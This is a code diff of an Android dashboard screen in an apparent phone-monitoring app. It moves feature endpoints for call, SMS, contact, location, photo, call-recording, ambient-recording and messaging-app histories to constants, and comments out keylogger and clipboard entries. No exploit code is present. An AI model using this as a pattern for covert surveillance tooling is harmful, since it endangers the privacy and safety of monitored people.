@@ -22,6 +22,17 @@ import com.jexpa.secondclone.R;
 import java.util.ArrayList;
 import java.util.List;
 
+import static com.jexpa.secondclone.API.Global.GET_AMBIENT_VOICE_RECORDING;
+import static com.jexpa.secondclone.API.Global.GET_APPLICATION_USAGE;
+import static com.jexpa.secondclone.API.Global.GET_CALL_HISTORY;
+import static com.jexpa.secondclone.API.Global.GET_CONTACT_HISTORY;
+import static com.jexpa.secondclone.API.Global.GET_LOCATION_HISTORY;
+import static com.jexpa.secondclone.API.Global.GET_NOTES_HISTORY;
+import static com.jexpa.secondclone.API.Global.GET_PHONE_CALL_RECORDING;
+import static com.jexpa.secondclone.API.Global.GET_PHOTO_HISTORY;
+import static com.jexpa.secondclone.API.Global.GET_SMS_HISTORY;
+import static com.jexpa.secondclone.API.Global.GET_URL_HISTORY;
+
 /**
  * Author: Lucaswalker@jexpa.com
  * Class: DashBoardRe
@@ -36,6 +47,7 @@ public class DashBoard extends AppCompatActivity {
     public Table table;
     private RecyclerView.Adapter mAdapter;
     private int packageID;
+    ArrayList<Feature> featureList;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -62,30 +74,33 @@ public class DashBoard extends AppCompatActivity {
         rcl_Feature.setHasFixedSize(true);
         RecyclerView.LayoutManager mLayoutManager = new GridLayoutManager(this,3);
         rcl_Feature.setLayoutManager(mLayoutManager);
-        ArrayList<Feature> featureList = new ArrayList<>();
-        featureList.add(new Feature(R.drawable.call_icon,getApplicationContext().getResources().getString(R.string.CALL_HISTORY),"GetCalls"));
-        featureList.add(new Feature(R.drawable.messeage_app,getApplicationContext().getResources().getString(R.string.SMS_HISTORY),"GetSMSByDateTime"));
-        featureList.add(new Feature(R.drawable.contact_icon,getApplicationContext().getResources().getString(R.string.CONTACT_HISTORY),"GetContacts"));
-        featureList.add(new Feature(R.drawable.url_browser,getApplicationContext().getResources().getString(R.string.URL_HISTORY),"GetURL"));
-        featureList.add(new Feature(R.drawable.gps_icon,getApplicationContext().getResources().getString(R.string.LOCATION_HISTORY), "GetLocations"));
-        featureList.add(new Feature(R.drawable.photo,getApplicationContext().getResources().getString(R.string.PHOTO_HISTORY),"GetPhotos"));
-        featureList.add(new Feature(R.drawable.phone_call_icon,getApplicationContext().getResources().getString(R.string.PHONE_CALL_RECORDING),"GetPhoneRecording"));
-        featureList.add(new Feature(R.drawable.voice_record_icon,getApplicationContext().getResources().getString(R.string.AMBIENT_VOICE_RECORDING),"GetAmbients"));
-        featureList.add(new Feature(R.drawable.app_usage_icon,getApplicationContext().getResources().getString(R.string.APPLICATION_USAGE),"GetApps"));
-        featureList.add(new Feature(R.drawable.note_icon,getApplicationContext().getResources().getString(R.string.NOTES_HISTORY),"GetNotes"));
-        featureList.add(new Feature(R.drawable.whatsapp_icon,getApplicationContext().getResources().getString(R.string.WHATSAPP_HISTORY),"GetSMSByDateTime"));
-        featureList.add(new Feature(R.drawable.viber_icon,getApplicationContext().getResources().getString(R.string.VIBER_HISTORY),"GetSMSByDateTime"));
-        featureList.add(new Feature(R.drawable.messenger_small,getApplicationContext().getResources().getString(R.string.FACEBOOK_HISTORY),"GetSMSByDateTime"));
-        featureList.add(new Feature(R.drawable.skype_icon,getApplicationContext().getResources().getString(R.string.SKYPE_HISTORY),"GetSMSByDateTime"));
-        featureList.add(new Feature(R.drawable.hangoust,getApplicationContext().getResources().getString(R.string.HANGOUTS_HISTORY),"GetSMSByDateTime"));
-        featureList.add(new Feature(R.drawable.instagram_icon,getApplicationContext().getResources().getString(R.string.INSTAGRAM_HISTORY),"GetSMSByDateTime"));
+        featureList = new ArrayList<>();
+
+        featureList.add(new Feature(R.drawable.call_icon,getApplicationContext().getResources().getString(R.string.CALL_HISTORY),GET_CALL_HISTORY));
+        featureList.add(new Feature(R.drawable.messeage_app,getApplicationContext().getResources().getString(R.string.SMS_HISTORY),GET_SMS_HISTORY));
+        featureList.add(new Feature(R.drawable.contact_icon,getApplicationContext().getResources().getString(R.string.CONTACT_HISTORY),GET_CONTACT_HISTORY));
+        featureList.add(new Feature(R.drawable.url_browser,getApplicationContext().getResources().getString(R.string.URL_HISTORY),GET_URL_HISTORY));
+        featureList.add(new Feature(R.drawable.gps_icon,getApplicationContext().getResources().getString(R.string.LOCATION_HISTORY), GET_LOCATION_HISTORY));
+        featureList.add(new Feature(R.drawable.photo,getApplicationContext().getResources().getString(R.string.PHOTO_HISTORY),GET_PHOTO_HISTORY));
+        featureList.add(new Feature(R.drawable.phone_call_icon,getApplicationContext().getResources().getString(R.string.PHONE_CALL_RECORDING),GET_PHONE_CALL_RECORDING));
+        featureList.add(new Feature(R.drawable.voice_record_icon,getApplicationContext().getResources().getString(R.string.AMBIENT_VOICE_RECORDING),GET_AMBIENT_VOICE_RECORDING));
+        featureList.add(new Feature(R.drawable.app_usage_icon,getApplicationContext().getResources().getString(R.string.APPLICATION_USAGE),GET_APPLICATION_USAGE));
+        featureList.add(new Feature(R.drawable.note_icon,getApplicationContext().getResources().getString(R.string.NOTES_HISTORY),GET_NOTES_HISTORY));
+        featureList.add(new Feature(R.drawable.whatsapp_icon,getApplicationContext().getResources().getString(R.string.WHATSAPP_HISTORY),GET_SMS_HISTORY));
+        featureList.add(new Feature(R.drawable.viber_icon,getApplicationContext().getResources().getString(R.string.VIBER_HISTORY),GET_SMS_HISTORY));
+        featureList.add(new Feature(R.drawable.messenger_small,getApplicationContext().getResources().getString(R.string.FACEBOOK_HISTORY),GET_SMS_HISTORY));
+        featureList.add(new Feature(R.drawable.skype_icon,getApplicationContext().getResources().getString(R.string.SKYPE_HISTORY),GET_SMS_HISTORY));
+        featureList.add(new Feature(R.drawable.hangoust,getApplicationContext().getResources().getString(R.string.HANGOUTS_HISTORY),GET_SMS_HISTORY));
+
+
+        /* featureList.add(new Feature(R.drawable.instagram_icon,getApplicationContext().getResources().getString(R.string.INSTAGRAM_HISTORY),""));
         featureList.add(new Feature(R.drawable.keylogger_icon,getApplicationContext().getResources().getString(R.string.KEYLOGGER_HISTORY),""));
         featureList.add(new Feature(R.drawable.notification_icon,getApplicationContext().getResources().getString(R.string.NOTIFICATION_HISTORY),""));
         featureList.add(new Feature(R.drawable.alert_icons,getApplicationContext().getResources().getString(R.string.Alert_HISTORY),""));
         featureList.add(new Feature(R.drawable.app_install,getApplicationContext().getResources().getString(R.string.APP_INSTALL),""));
         featureList.add(new Feature(R.drawable.keyboard_icon,getApplicationContext().getResources().getString(R.string.CLIPBOARD_HISTORY),""));
         featureList.add(new Feature(R.drawable.calendar_icon,getApplicationContext().getResources().getString(R.string.CALENDAR_HISTORY),""));
-        featureList.add(new Feature(R.drawable.wifi_status,getApplicationContext().getResources().getString(R.string.WIFI_HISTORY),""));
+        featureList.add(new Feature(R.drawable.wifi_status,getApplicationContext().getResources().getString(R.string.WIFI_HISTORY),""));*/
 
         APIDatabase.getTimeLastSync(txt_Last_Sync, DashBoard.this, table.getLast_Online());
         // adapter
@@ -102,9 +117,6 @@ public class DashBoard extends AppCompatActivity {
                 startActivity(intent);
             }
         });
-
-
-//        new ContactHistory.contactAsyncTask(0).execute();
     }
 
     private void setID()
@@ -121,4 +133,10 @@ public class DashBoard extends AppCompatActivity {
     }
 
 
+    @Override
+    protected void onResume() {
+        super.onResume();
+        mAdapter = new AdapterFeatureDashboard(featureList, DashBoard.this, table);
+        rcl_Feature.setAdapter(mAdapter);
+    }
 }
